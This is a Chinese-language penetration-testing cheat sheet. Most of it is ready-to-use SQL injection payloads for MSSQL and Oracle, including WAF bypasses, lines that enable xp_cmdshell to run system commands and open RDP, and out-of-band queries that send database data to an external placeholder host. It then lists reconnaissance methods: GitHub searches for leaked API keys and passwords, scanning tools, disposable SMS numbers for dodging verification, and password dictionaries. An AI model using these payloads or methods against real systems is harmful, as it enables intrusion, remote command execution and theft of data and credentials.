# 渗透相关语法

相关漏洞学习资料，利用方法和技巧合集 


目录
-----------------

* [Hacking study](#渗透相关语法)
	* [注入基础](#注入基础)
		 * [mssql注入](#mssql注入)
			* [布尔注入](#布尔注入)
			* [报错注入](#报错注入)
			* [waf绕过](#waf绕过)
		 * [oracle注入](#oracle注入)
			* [联合查询](#联合查询)
			* [报错注入](#报错注入)
			* [带外注入](#带外注入)
			* [时间盲注](#时间盲注)
	* [信息收集](#信息收集)
		* [域名相关](#域名相关)
		* [指纹识别](#指纹识别)
		* [ip位置](#ip位置)
		* [备案查询](#备案查询)
		* [目录枚举](#目录枚举)
		* [github语法](#github语法)
		* [端口扫描](#端口扫描)
		* [其他](#其他)
## 注入基础
> **mssql、mysql、oracle 相关注入基础语句** 
### mssql注入

#### 布尔注入

**判断版本号**
```
' aNd @@version LIKE '%2015%'--+	
```
**如果存在，返回 true说明后台数据库是MSSQL，否则返回 false**
```
' and exists(select * from sysobjects)--+	
```
**判断当前是否为sa**
```
' and exists(select is_srvrolemember('sysadmin'))--+	
```
**判断有没有xp_cmdshell扩展**
```
' and (select count(*) FROM master. dbo.sysobjects Where xtype ='X' AND name = 'xp_cmdshell')>0--+	
```
**恢复xp_cmdshell**
```
';dbcc addextendedproc ("sp_oacreate","odsole70.dll")
';dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
或
';exec sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'--+
```
**开启xp_cmdshell**
```
;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--+
```
**命令执行**
```
';exec master..xp_cmdshell 'net user'--+	
' and 1=(select * from openrowset('sqloledb','trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''net user'''))--+
```
**创建一个包含两个字段t1的cmd_sql表**
```
'; CREATE TABLE cmd_sql (t1 varchar(8000))--+
将执行结果存入t1中
';+insert into cmd_sql(t1) exec master..xp_cmdshell 'net user'--+
```
**开启3389端口**
```
';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+	
```

#### 报错注入

**查看版本号**
```
file_name(@@version)
```
**变换N的值就可以爆出所有数据库的名称**
```
' and (convert(int,db_name(N)))>0--+ 
```
**查看当前用户**
```
' and (user)>0--+ 	
' and 1=(select CAST(USER as int))--+
```
**获取当前数据库**  
```
' and 1=(select db_name())--+
```
**获取数据库该语句是一次性获取全部数据库，且语句只适合>=2005**
```
' and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--+
' and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))--+
```
**获取数据库所有表（只限于mssql2005及以上版本）**
```
' and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--+
' and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--+
' and 1=(select top 1 name from sysobjects where xtype='u' and name <> '第一个数据库表名')--+
```
**一次性爆N条所有字段的数据（只限于mssql2005及以上版本）**
```
' and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--+
' and 1=(select top 1 * from 指定数据库..指定表名 FOR XML PATH(''))--+
```
**暴表**
```
' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
```

#### waf绕过

**获取版本和数据库名**
```
'%1eaNd%1e@@version LIKE '%2015%'--+	
'%1eoR%1e1=(db_name/**/()%1e)%1e--+
```
**获取全部数据库**
```
'%1eoR%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename(name)%1efRom master%0f..sysobjects%1ewHerE%1extype='U' FOR XML PATH(''))%1e--
```
**获取表的所有列**
```
'%1eaND%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename/**/(name)%1efRom 数据库名%0f..syscolumns%1ewHerE%1eid=(selEct/*xxxxxxxxx*/%1eid%1efrom%1e数据库名%0f..sysobjects%1ewHerE%1ename='表名')%1efoR%1eXML%1ePATH/**/(''))%1e-
```

### oracle注入

#### 联合查询

**判断是否oracle，在mssql和mysql以及db2内返回长度值是调用len()函数；在oracle和INFORMIX则是length()**
```
' and len('a')=1--+
```
**获取当前数据库用户**
```
' and 1=2 union select null,(select banner from sys.v_$version where rownum=1),null from dual--+
```
**爆当前数据库中的第二个表**
```
' and 1=2 union select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual--+
```
**爆某表中的第一个字段**
```
' and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual--+
```

#### 报错注入

**获取当前数据库用户**
```
' and 1=ctxsys.drithsx.sn(1,(select user from dual))--+
' and 1=utl_inaddr.get_host_name((select user from dual))--+
' and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--+
' and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--+
' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--+
' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null--+
' and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null--+
' and (select dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null--+
' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--+
```

#### 带外注入

**获取当前数据库用户**
```
' and (select utl_inaddr.get_host_address((select user from dual)||'.xxx.xxx') from dual) is not null--+
```
**获取版本信息**
```
' and 1=utl_http.request('.xxx.xxxx'||(select banner from sys.v_$version where rownum=1))--+
' and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.xxxx.xxxx') from dual) is not null--+
```

#### 时间盲注
**当前获取用户**
```
' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10))--+
' AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),1,1))>96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END)
```

## 信息收集

> **前端js代码进行审计发现的一些路径去测试访问**

### 域名相关

**工具**
```
subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
Sublist3r
subfinder
dnsbrute：https://github.com/chuhades/dnsbrute
```
**在线查询**
```
https://d.chinacycc.com/index.php?m=login
http://z.zcjun.com/
https://phpinfo.me/domain/
```
**查询域名信息**
http://link.chinaz.com/
几个whois查询站点：Chinaz、Aliyun、Whois365 

### 指纹识别

**查询web/系统指纹**
```
https://www.ddosi.com/ 
https://whatweb.net/
https://www.zoomeye.org/
http://whatweb.bugscaner.com
http://www.yunsee.cn/
http://whatweb.bugscaner.com/look/ 
http://www.yunsee.cn/finger.html 
```

### ip位置

**查询ip地理位置**
```
https://www.ipip.net/
```
**查询物联网等信息**
```
https://www.oshadan.com/
```

### 备案查询

**备案号查询**
```
http://www.beianbeian.com/
```
**ssl证书查询**
```
https://myssl.com/
https://censys.io/
```
**搜索引擎查询**
```
google，baidu，bing，fofa， 
shodan：https://www.shodan.io/ 
```

### 目录枚举
**目录爆破（可以查看html源代码收集目录）**
```
https://github.com/7kbstorm/7kbscan-WebPathBrute
dirsearch
御剑工具
Web敏感文件robots.txt、crossdomain.xml、sitemap.xml 
```

### github语法

**通过github收集信息**
``` 
"xxx.com" API_key
"xxx.com" secret_key
"xxx.com" aws_key
"xxx.com" Password 
"xxx.com" FTP
"xxx.com"  login 
"xxx.com" github_token
"api.xxx.com" 
```

**IP段收集**
``` 
通过shodan来收集ip段，通过shodan来收集ip主要是利用shodan收集厂商特征ico
通过AS号收集ip段我们可以通过在线网站 https://bgp.he.net 来查厂商的所属ip段 
通过ip服务器查询：
webscan：http://www.webscan.cc/
微步：https://x.threatbook.cn/
netcraft：https://toolbar.netcraft.com/site_report 
```

### 端口扫描
**端口查询**
```
利用masscan来扫描全端口，再调用nmap来扫描端口开启的服务，扫完端口后我们可以写个脚本来解析nmap的扫描结果，将开放的端口提取出来 
```

### 其他

**邮箱挖掘**
```
通过TheHarvester可以进行邮箱挖掘 
```
**厂商业务收集**
```
除了web端的信息收集以外，app和公众号也是我们不可忽视的一点，很多大的漏洞往往就在app端或者公众号上，收集厂商app的方法，一般我是利用crunchbase来进行app的收集的，除了app，公众号也可以通过天眼查和微信自身的搜索功能进行收集的。 
利用云网盘搜索工具搜集敏感文件https://www.lingfengyun.com/ 
```
**免费接码**
```
http://www.smszk.com/
http://www.z-sms.com/
https://getfreesmsnumber.com/
https://www.freeonlinephone.org/
http://mail.bccto.me/
http://24mail.chacuo.net/
**几个生成字典方式**
```
https://github.com/rootphantomer/Blasting_dictionary
https://www.itxueke.com/tools/pass/#
http://xingchen.pythonanywhere.com/index
https://github.com/LandGrey/pydictor
https://www.somd5.com/download/dict/
```


